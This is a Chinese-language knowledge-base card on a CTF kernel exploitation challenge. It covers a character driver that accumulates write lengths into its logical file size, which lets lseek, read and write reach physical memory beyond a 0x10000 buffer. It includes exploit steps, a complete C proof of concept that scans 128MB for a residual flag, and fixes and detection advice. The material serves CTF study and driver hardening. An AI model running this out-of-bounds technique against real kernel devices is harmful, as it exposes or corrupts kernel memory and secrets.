---
id: binary-pwn-kernel-write-size-growth-seek-oob-physical-scan
title: 内核驱动 write 无限累加文件长度 + seek 只按逻辑大小校验：任意偏移越界读写物理内存扫残留 flag
type: scenario
domain: binary
path: binary/pwn/kernel
technique: kernel-write-pos-size-growth-seek-oob
tags:
- pwn
- kernel
- oob-read
- oob-write
- lseek
- file-position
- physical-memory
- residual
- ctf
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V176
  verified_at: '2026-11-06T16:55:52+08:00'
  notes: 已对照原文核对：write 长度累加/end 更新、seek 按 end-start 校验、ioctl 0x83170405 泄露 global_buf、128MB 扫描与 PoC 均与原文一致；read 反编译缺失，卡片已标注按同构逻辑推断，PoC 未在本机复跑
url: /docs/binary/pwn/kernel/binary-pwn-kernel-write-size-growth-seek-oob-physical-scan/
draft: false
kb_aliases:
- Write-Pos Overflow
- 内核驱动写位置溢出
- 文件长度无限增长越界
- lseek 越界读写
- 扫物理内存找残留 flag
- ram_snoop
---

## 一句话结论

字符设备驱动把“累计写入长度”直接当作逻辑文件大小，每次 write 都在 `global_buf+0x10008` 上累加写入字节数而不校验当前偏移是否真的在扩展文件；攻击者可反复 `lseek(fd,0,SEEK_SET)+write(fd,buf,0x10000)` 把逻辑大小涨到 128MB，而真实缓冲区只有 0x10000，随后 `lseek` 只按这个虚增的逻辑大小放行，任意大偏移的 read/write 就落到缓冲区之后的物理内存上，可扫描残留 flag 或读写相邻内核内存。

## 原理

- 设备上下文 `global_buf` 是一块 0x10000 字节的全局缓冲区，在偏移 `+0x10000`/`+0x10008` 处维护逻辑文件起点与终点（`start`/`end`）；用户通过 ioctl（本文题目为 `0x83170405`）可泄露 `global_buf` 地址。
- `write` 的核心逻辑：
  - 取当前文件偏移 `pos = *ppos`；
  - 若 `pos > 0xFFFF` 且 `pos >= end`，返回 `-105`，看似在阻止越界增长；
  - 若 `pos + count > 0x10000`，把本次长度改成 `n = (u16)(-*(u16 *)ppos)`，即 `0x10000 - (pos & 0xFFFF)`，让写入恰好结束在下一个 0x10000 边界；
  - 之后执行 `copy_from_user(global_buf + start + pos, user_buf, n)`，并做 `*ppos += n`、`end += n`。
- 关键缺陷是“写长度累加”与“当前偏移”解耦：即使先 `lseek(0)` 回到起点覆盖写，`end` 仍会按 `n` 增加。于是反复 `lseek(0)+write(0x10000)` 可以把 `end` 从 0x10000 一路涨到 0x08000000（128MB），而缓冲区始终只有 0x10000。
- `seek` 的边界检查是 `new_pos <= end - start`，只信这个被虚增的逻辑大小，不校验真实缓冲区容量。因此 `end` 涨大后，`lseek` 到任意不超过 128MB 的偏移都会成功。
- 对 `pos > 0x10000` 的写入，长度修正 `n = 0x10000 - (pos & 0xFFFF)` 只保证结束地址对齐到 0x10000 边界，并不阻止从 `pos` 开始越界访问；例如 `pos=0x18000` 时 `n=0x8000`，写入范围是 `[0x18000,0x20000)`，已经越过 0x10000 的缓冲区。
- `read` 采用同构逻辑：从 `global_buf + start + pos` 处 `copy_to_user`，`lseek` 放行后即可把缓冲区之后的物理内存读回用户态。把设备当成“可任意偏移读的物理内存窗口”，按 0x10000 步进扫描 128MB，即可找到 flag 进程读入后残留在物理页中的 `flag{...}`。
- 成立前提是物理页在释放后不被清零（默认 `init_on_free=0`），flag 先被读进用户/内核内存再删除文件，内容仍留在某个物理页。

## 触发条件

- 可打开存在该缺陷的字符设备（如题目中的 `/dev/noc`），设备权限允许读写。
- 驱动把用户可控的写长度累加到全局“文件大小”，而真实缓冲区大小固定且更小。
- `seek`/`read`/`write` 只按逻辑大小或低 16 位做边界判断，没有用真实缓冲区容量截断。
- 目标内存中存在待恢复的残留数据（flag、密钥、内核指针），且物理页未被清零。
- 需要先获得 `global_buf` 地址（ioctl 泄露或其它信息泄露），才能把读到的内容映射回具体偏移。

## 利用步骤

1. 逆向驱动，确认 `global_buf` 大小、`+0x10000/+0x10008` 字段含义、write/read/seek 的边界判断与 ioctl 命令号。
2. 调用 ioctl 泄露 `global_buf` 地址，作为后续偏移基准。
3. 循环执行 `lseek(fd, 0, SEEK_SET)` + `write(fd, pad, 0x10000)`，重复 `0x08000000 / 0x10000 = 0x800` 次，把逻辑大小 `end` 涨到 128MB。
4. 从偏移 0 开始，以 0x10000 为步进 `lseek(fd, off, SEEK_SET)` + `read(fd, buf, 0x10000)`，在每块数据中搜索 `flag{` 等标记。
5. 命中后结合跨块边界（上一块末尾 16 字节 + 当前块开头）重新读取完整字符串，按可打印字符截取到 `}`。
6. 授权测试在本地 QEMU 靶机进行；不要对真实内核设备尝试大范围越界写。

## PoC

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEV "/dev/noc"
#define CHUNK 0x10000UL
#define SCAN_SIZE 0x08000000UL

struct noc_ {
    int32_t index;
    char command[0x10];
    int32_t date1;
    int32_t date2;
    int32_t padding;
    uint64_t buf;
};

int main(void) {
    int fd = open(DEV, O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    struct noc_ info = {0};
    if (ioctl(fd, 0x83170405UL, &info) < 0) { perror("ioctl"); return 1; }
    uint64_t base = info.buf;
    printf("[*] global_buf = 0x%lx\n", (unsigned long)base);

    char pad[CHUNK];
    memset(pad, 'A', sizeof(pad));
    for (unsigned long i = 0; i < SCAN_SIZE / CHUNK; i++) {
        lseek(fd, 0, SEEK_SET);
        if (write(fd, pad, CHUNK) != (ssize_t)CHUNK) { perror("write"); return 1; }
    }

    char buf[CHUNK];
    for (unsigned long off = 0; off < SCAN_SIZE; off += CHUNK) {
        if (lseek(fd, (off_t)off, SEEK_SET) < 0) continue;
        ssize_t n = read(fd, buf, CHUNK);
        if (n <= 0) continue;
        for (ssize_t i = 0; i + 5 <= n; i++) {
            if (!memcmp(buf + i, "flag{", 5)) {
                printf("[+] candidate at 0x%lx + 0x%lx\n",
                       (unsigned long)base + off, (unsigned long)i);
                fwrite(buf + i, 1, (size_t)(n - i), stdout);
                return 0;
            }
        }
    }
    puts("[-] not found");
    return 1;
}
```

说明：以上为按原文驱动逻辑重写的最小验证框架，原文 exp 在网页排版中存在括号/分号缺失，且未在本机复跑；实际使用时需按目标设备的 ioctl 结构体、`start` 初值与 read 返回值语义调整。

## 变体与关联

- 变体：只涨 `end` 不越界写，利用 read 做纯信息泄露（更安全，适合真实驱动评估）。
- 变体：把 `end` 涨到内核直接映射区偏移后读写相邻 slab/页表对象，从信息泄露升级为任意物理内存读写；参见 [[binary-pwn-kernel-dirty-pagetable-pmd-pte-overlap-physical-rw]]。
- 变体：若 `read`/`write` 的边界检查用低 16 位（`(u16)-pos`）而不是真实剩余空间，即使不涨 `end` 也可能在 `pos` 略大于缓冲区时越界。
- 关联：[[binary-pwn-kernel-ioctl-global-length-oob-read-flag]]（同样是内核 OOB read 取 flag，但靠全局长度控制 `copy_to_user`）、[[binary-pwn-kernel-egg-hunter-physical-memory-scan]]（物理内存残留 flag 扫描，走内核 shellcode 直接映射）、[[ctf-pwn-heap-residual-uninitialized-read-flag]]（残留数据未初始化读）。
- 关联：这是“文件位置/长度记账与真实缓冲区容量脱钩”这一类驱动 bug，和 `f_pos` 未校验、`llseek` 越界的真实内核漏洞同源。

## 检测与防御

- 修复：写入前用真实缓冲区容量做边界检查，长度必须按 `min(count, capacity - pos)` 截断；不能用 `(u16)-pos` 这类按对齐推导的长度。
- 修复：只有 `pos + n` 真正扩展文件尾时才更新 `end`，覆盖写不应增加逻辑大小；`seek` 必须用真实缓冲区容量而非逻辑大小做上限。
- 加固：设备节点最小权限（600/660），仅授权用户可打开；内核开启 KASAN/KFENCE、`init_on_free=1` 减少残留数据。
- 检测：审计驱动中 `*ppos`、文件大小字段与 `copy_to_user`/`copy_from_user` 的边界计算；监控异常大偏移的 lseek/read/write 序列和超大范围顺序读；对 `/dev/<自定义设备>` 的高频访问告警。
